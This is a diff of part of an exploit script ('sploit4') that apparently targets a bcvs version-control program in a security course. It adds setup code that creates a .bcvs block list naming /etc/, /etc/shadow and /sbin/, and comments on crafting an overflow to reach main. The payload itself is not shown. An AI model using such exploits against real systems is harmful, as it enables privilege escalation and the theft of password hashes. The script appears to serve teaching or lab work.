@@ -6,14 +6,23 @@
 ## main. This overflow needs to be carefully crated to not cause
 ## problems with other function calls like copyFile.
 ##
-## Not working at the moment
 ## --------------------------------------------------------------- ##
+
+REPODIR=".bcvs"
+BLOCKLIST="block.list"
+BLOCKLISTPATH="${REPODIR}/${BLOCKLIST}"
 
 rm -rf sploit4_dir
 mkdir sploit4_dir
 cd sploit4_dir
 mkdir .bcvs
 touch .bcvs/block.list
+
+#blocklist - Exact copy of the one in bcvs's directory
+echo $REPODIR > $BLOCKLISTPATH
+echo "/etc/" >> $BLOCKLISTPATH
+echo "/etc/shadow" >> $BLOCKLISTPATH
+echo "/sbin/" >> $BLOCKLISTPATH
 
 ## The following section hold the text for any supporting programs or
 ## scripts for this sploit.
